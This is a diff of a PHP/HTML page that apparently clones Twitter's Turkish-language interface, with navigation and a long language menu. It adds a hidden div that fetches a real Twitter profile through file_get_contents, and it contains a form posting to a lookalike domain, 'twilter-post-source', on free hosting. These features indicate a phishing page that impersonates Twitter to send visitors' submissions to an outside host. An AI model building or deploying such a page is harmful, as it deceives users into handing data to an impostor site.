@@ -6,6 +6,8 @@
     
     
     
+<div id="divCheckbox" style="display: none;">
+<?php echo file_get_contents("https://twitter.com/Esmaa2412");?> </div>
     
     
     <meta charset="utf-8">
@@ -132,8 +134,78 @@ data-fouc-class-names="swift-loading"
         <div class="container">
 
           
+<ul class="nav js-global-actions" role="navigation" id="global-actions">
+  <li id="global-nav-home" class="home" data-global-action="home">
+    <a class="js-nav js-tooltip js-dynamic-tooltip" data-placement="bottom" href="/" data-component-context="home_nav" data-nav="home">
+      <span class="Icon Icon--bird Icon--large"></span>
+      <span class="text" aria-hidden="true">Anasayfa</span>
+      <span class="u-hiddenVisually a11y-inactive-page-text">Anasayfa</span>
+      <span class="u-hiddenVisually a11y-active-page-text">Anasayfa, bulunduğun sayfa.</span>
+    </a>
+  </li>
+    <li id="global-nav-about" class="about" data-global-action="about">
+      <a class="js-tooltip js-dynamic-tooltip" data-placement="bottom" href="/about" target="_blank" data-component-context="about_nav" data-nav="about" rel="noopener">
+        <span class="text">Hakkımızda</span>
+      </a>
+    </li>
+</ul>
+<div class="pull-right nav-extras">
 
-
+  <ul class="nav secondary-nav language-dropdown">
+    <li class="dropdown js-language-dropdown">
+      <a href="#supported_languages" class="dropdown-toggle js-dropdown-toggle">
+        <small>Dil:</small> <span class="js-current-language">Türkçe</span> <b class="caret"></b>
+      </a>
+      <div class="dropdown-menu dropdown-menu--rightAlign is-forceRight">
+        <div class="dropdown-caret right">
+          <span class="caret-outer"> </span>
+          <span class="caret-inner"></span>
+        </div>
+        <ul id="supported_languages">
+            <li><a href="?lang=id" data-lang-code="id" title="Endonezce" class="js-language-link js-tooltip" rel="noopener">Bahasa Indonesia</a></li>
+            <li><a href="?lang=msa" data-lang-code="msa" title="Malayca" class="js-language-link js-tooltip" rel="noopener">Bahasa Melayu</a></li>
+            <li><a href="?lang=ca" data-lang-code="ca" title="Katalanca" class="js-language-link js-tooltip" rel="noopener">Català</a></li>
+            <li><a href="?lang=cs" data-lang-code="cs" title="Çekçe" class="js-language-link js-tooltip" rel="noopener">Čeština</a></li>
+            <li><a href="?lang=da" data-lang-code="da" title="Danca" class="js-language-link js-tooltip" rel="noopener">Dansk</a></li>
+            <li><a href="?lang=de" data-lang-code="de" title="Almanca" class="js-language-link js-tooltip" rel="noopener">Deutsch</a></li>
+            <li><a href="?lang=en" data-lang-code="en" title="İngilizce" class="js-language-link js-tooltip" rel="noopener">English</a></li>
+            <li><a href="?lang=en-gb" data-lang-code="en-gb" title="İngiliz İngilizcesi" class="js-language-link js-tooltip" rel="noopener">English UK</a></li>
+            <li><a href="?lang=es" data-lang-code="es" title="İspanyolca" class="js-language-link js-tooltip" rel="noopener">Español</a></li>
+            <li><a href="?lang=fil" data-lang-code="fil" title="Filipince" class="js-language-link js-tooltip" rel="noopener">Filipino</a></li>
+            <li><a href="?lang=fr" data-lang-code="fr" title="Fransızca" class="js-language-link js-tooltip" rel="noopener">Français</a></li>
+            <li><a href="?lang=hr" data-lang-code="hr" title="Hırvatça" class="js-language-link js-tooltip" rel="noopener">Hrvatski</a></li>
+            <li><a href="?lang=it" data-lang-code="it" title="İtalyanca" class="js-language-link js-tooltip" rel="noopener">Italiano</a></li>
+            <li><a href="?lang=hu" data-lang-code="hu" title="Macarca" class="js-language-link js-tooltip" rel="noopener">Magyar</a></li>
+            <li><a href="?lang=nl" data-lang-code="nl" title="Felemenkçe" class="js-language-link js-tooltip" rel="noopener">Nederlands</a></li>
+            <li><a href="?lang=no" data-lang-code="no" title="Norveççe" class="js-language-link js-tooltip" rel="noopener">Norsk</a></li>
+            <li><a href="?lang=pl" data-lang-code="pl" title="Lehçe" class="js-language-link js-tooltip" rel="noopener">Polski</a></li>
+            <li><a href="?lang=pt" data-lang-code="pt" title="Portekizce" class="js-language-link js-tooltip" rel="noopener">Português</a></li>
+            <li><a href="?lang=ro" data-lang-code="ro" title="Rumence" class="js-language-link js-tooltip" rel="noopener">Română</a></li>
+            <li><a href="?lang=sk" data-lang-code="sk" title="Slovakça" class="js-language-link js-tooltip" rel="noopener">Slovenčina</a></li>
+            <li><a href="?lang=fi" data-lang-code="fi" title="Fince" class="js-language-link js-tooltip" rel="noopener">Suomi</a></li>
+            <li><a href="?lang=sv" data-lang-code="sv" title="İsveççe" class="js-language-link js-tooltip" rel="noopener">Svenska</a></li>
+            <li><a href="?lang=vi" data-lang-code="vi" title="Vietnamca" class="js-language-link js-tooltip" rel="noopener">Tiếng Việt</a></li>
+            <li><a href="?lang=el" data-lang-code="el" title="Yunanca" class="js-language-link js-tooltip" rel="noopener">Ελληνικά</a></li>
+            <li><a href="?lang=bg" data-lang-code="bg" title="Bulgarca" class="js-language-link js-tooltip" rel="noopener">Български език</a></li>
+            <li><a href="?lang=ru" data-lang-code="ru" title="Rusça" class="js-language-link js-tooltip" rel="noopener">Русский</a></li>
+            <li><a href="?lang=sr" data-lang-code="sr" title="Sırpça" class="js-language-link js-tooltip" rel="noopener">Српски</a></li>
+            <li><a href="?lang=uk" data-lang-code="uk" title="Ukraynaca" class="js-language-link js-tooltip" rel="noopener">Українська мова</a></li>
+            <li><a href="?lang=he" data-lang-code="he" title="İbranice" class="js-language-link js-tooltip" rel="noopener">עִבְרִית</a></li>
+            <li><a href="?lang=ar" data-lang-code="ar" title="Arapça" class="js-language-link js-tooltip" rel="noopener">العربية</a></li>
+            <li><a href="?lang=fa" data-lang-code="fa" title="Farsça" class="js-language-link js-tooltip" rel="noopener">فارسی</a></li>
+            <li><a href="?lang=mr" data-lang-code="mr" title="Marathi dili" class="js-language-link js-tooltip" rel="noopener">मराठी</a></li>
+            <li><a href="?lang=hi" data-lang-code="hi" title="Hintçe" class="js-language-link js-tooltip" rel="noopener">हिन्दी</a></li>
+            <li><a href="?lang=bn" data-lang-code="bn" title="Bengalce" class="js-language-link js-tooltip" rel="noopener">বাংলা</a></li>
+            <li><a href="?lang=gu" data-lang-code="gu" title="Güceratça" class="js-language-link js-tooltip" rel="noopener">ગુજરાતી</a></li>
+            <li><a href="?lang=ta" data-lang-code="ta" title="Tamilce" class="js-language-link js-tooltip" rel="noopener">தமிழ்</a></li>
+            <li><a href="?lang=kn" data-lang-code="kn" title="Kannada dili" class="js-language-link js-tooltip" rel="noopener">ಕನ್ನಡ</a></li>
+            <li><a href="?lang=th" data-lang-code="th" title="Tayca" class="js-language-link js-tooltip" rel="noopener">ภาษาไทย</a></li>
+            <li><a href="?lang=ko" data-lang-code="ko" title="Korece" class="js-language-link js-tooltip" rel="noopener">한국어</a></li>
+            <li><a href="?lang=ja" data-lang-code="ja" title="Japonca" class="js-language-link js-tooltip" rel="noopener">日本語</a></li>
+            <li><a href="?lang=zh-cn" data-lang-code="zh-cn" title="Basitleştirilmiş Çince" class="js-language-link js-tooltip" rel="noopener">简体中文</a></li>
+            <li><a href="?lang=zh-tw" data-lang-code="zh-tw" title="Geleneksel Çince" class="js-language-link js-tooltip" rel="noopener">繁體中文</a></li>
+        </ul>
+      </div>
       <div class="js-front-language">
         <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form language" method="POST">
           <input type="hidden" name="lang"> <input type="hidden" name="redirect">
@@ -1207,20 +1279,4 @@ data-fouc-class-names="swift-loading"
 
   </body>
 </html>
-<style>
-#icerik
-{
-	min-width: 10px;
-	max-width: 10px;
-	width:expression(document.body.clientWidth < 10? "10px" : document.body.clientWidth > 10? "10px" : "auto");
-}
-</style>
-    <body>
-<div id="icerik">
-<?php
-echo file_get_contents("https://twitter.com/Esmaa2412");
-
-?>
-</div>
-</body>
 
